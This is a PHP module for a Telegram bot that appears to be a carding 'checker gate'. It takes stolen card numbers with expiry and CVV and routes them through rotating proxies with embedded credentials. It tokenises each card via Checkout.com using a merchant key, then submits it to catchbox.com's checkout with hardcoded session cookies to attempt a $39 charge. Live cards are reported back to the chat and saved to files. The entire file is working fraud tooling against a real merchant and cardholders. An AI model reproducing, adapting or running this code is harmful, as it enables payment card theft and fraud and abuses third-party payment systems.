<?php

#----------------------------------------------------------------------#
#   GATE: CHECKOUT CHARGE $39 							                           #
#   SITE: https://catchbox.com/index.php	         			               #
#----------------------------------------------------------------------#


if ((strpos($message, "/co") === 0) || (strpos($message, "!co") === 0)){

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}


function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
    };
  
function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };


$lista = substr($message, 4);
  
$lista = preg_replace('/[^0-9]+/', ' ', $lista);
$lista = ltrim($lista);
    $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
  
$strlen1 = strlen($mes);
$ano1 = $ano;
    if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1;   }

$lista = "$cc|$mes|$ano|$cvv";
  
if (strlen($ano) == 2) $ano = "20$ano";
if ($mes < 10) $mes = substr($mes, 1, 1);


//==================[BIN LOOK-UP]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$type = $binna['type'];
$level = $binna['category'];
$country = $binna['country']['name'];
$emoji = $binna['country']['emoji'];
$bank = $binna['bank']['name'];
//$bank = getStr($bindata,'"bank": {"name": "', '"')));
curl_close($ch);

$bindata1 = " $bin - $brand - $type - $level - $bank - $country($emoji)";

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];

  
//=================== [Proxys Section] ==================//
$Websharegay = rand(0,250);
$rp1 = array(
  	//1 => 'krmcyqke-rotate:9kanicwn8thd',
  	1 => 'lookdvnz-rotate:mms1x3cqscnm',
  	2 => 'gpwaqrjb-rotate:tv6dlsbhyywo',
  	3 => 'vhpfjxsx-rotate:xmzs8124xvqg',
  	4 => 'zhtwglvf-rotate:8okrq6e9k62o',
    ); 
    $rotate = $rp1[array_rand($rp1)];
////==============[Proxy Section]===============////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)) { $ip = "Live! ✅"; }
if (empty($ip1)) { $ip = "Dead! ❌"; }

  
//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.checkout.com/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.checkout.com';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8';
$headers[] = 'Authorization: pk_8100332a-a3e6-4902-b0a2-03564d56975f';
$headers[] = 'Content-Type: application/json';
$headers[] = 'origin: https://js.checkout.com';
$headers[] = 'referer: https://js.checkout.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"type":"card","number":"'.$cc.'","expiry_month":'.$mes.',"expiry_year":'.$ano.',"cvv":"'.$cvv.'","name":"Elish Will","phone":{},"requestSource":"JS"}');
$res1 = curl_exec($ch);
curl_close($ch);
$err1 = trim(strip_tags(getStr($res1,'"error_type":"', '"')));
$id = trim(strip_tags(getStr($res1,'"token":"', '"')));

  
  

//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://catchbox.com/index.php?route=extension/payment/checkoutcom/send');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: catchbox.com';
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundary6WFkzvfnKkKHLYtM';
$headers[] = 'cookie: CATCHBOX_SESSID=116f18c3543c1e4217c0e989d1; language=en-gb; _gcl_au=1.1.1145049630.1644342441; _ga=GA1.2.1689733621.1644342442; _gid=GA1.2.1109154532.1644342442; _lfa=LF1.1.4822f268a96f9cdd.1644342443663; CookieConsent={stamp:%27-1%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cver:1%2Cutc:1644342445682%2Cregion:%27US%27}; _fbp=fb.1.1644342446788.1783670008; _hjSession_504774=eyJpZCI6Ijk0YmM0NTUzLWI3MjEtNDRlMC04OThlLTk2OGIxNTA3ZDAxMyIsImNyZWF0ZWQiOjE2NDQzNDI0NDY4NTAsImluU2FtcGxlIjpmYWxzZX0=; _hjFirstSeen=1; _hjAbsoluteSessionInProgress=1; hubspotutk=a05e6653a367b2f01553d1b943592468; __hssrc=1; _hjSessionUser_504774=eyJpZCI6ImJkODdhNGIyLTEwNDgtNTkwZS1hM2M0LTE5YWE2NDk5NDc3NCIsImNyZWF0ZWQiOjE2NDQzNDI0NDY4NDAsImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInPageviewSample=1; _hjIncludedInSessionSample=0; __hstc=217689801.a05e6653a367b2f01553d1b943592468.1644342451822.1644342451822.1644344316328.2; _uetsid=2be20e80890711ecb955138340aa5d7d; _uetvid=2be24bf0890711ec903bc34b76a9604f; __hssc=217689801.4.1644344316328; sessionId=a8f2d492-c13d-4394-bdd2-f8ba45e528b3; _gat_UA-45220147-1=1';
$headers[] = 'origin: https://catchbox.com';
$headers[] = 'referer: https://catchbox.com/index.php?route=checkout/checkout';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundary6WFkzvfnKkKHLYtM
Content-Disposition: form-data; name="cko-card-token"

'.$id.'
------WebKitFormBoundary6WFkzvfnKkKHLYtM
Content-Disposition: form-data; name="cko-payment"


------WebKitFormBoundary6WFkzvfnKkKHLYtM--');
$res2 = curl_exec($ch);
curl_close($ch);

  
//$err = trim(strip_tags(getStr($res2,'"message":"','"')));
$msg = trim(strip_tags(getStr($res2,'"error":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
  curl_close($ch);


//==================[Responses]======================//

if((strpos($res2, 'Success')) || (strpos($res2, "Successed")) || (strpos($res2, "success")) ){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$res2.'</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
	file_put_contents('save/cvv2.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
}

elseif ((strpos($res2, 'insufficient_funds')) || (strpos($res2, "Your card has insufficient funds."))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>Your card has Insufficient funds.</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
  	file_put_contents('save/insuff.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
}

elseif ((strpos($res2, 'incorrect_cvc')) || (strpos($res2, "Your card's security code is incorrect."))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<i><b> -⪼</b> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>Your cards security code is incorrect.</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
  	file_put_contents('save/ccn.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
}

elseif(strpos($res1,  'error')) {
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>DECLINED!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$res1.'</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}

elseif(strpos($res2,  '"error"')) {
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>DECLINED!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$msg.'</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}


else{
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>Error!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$res2.'</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}



curl_close($ch);
unlink("cookies.txt");
}

//====================[Stripe Inline Charge]=====================//

?>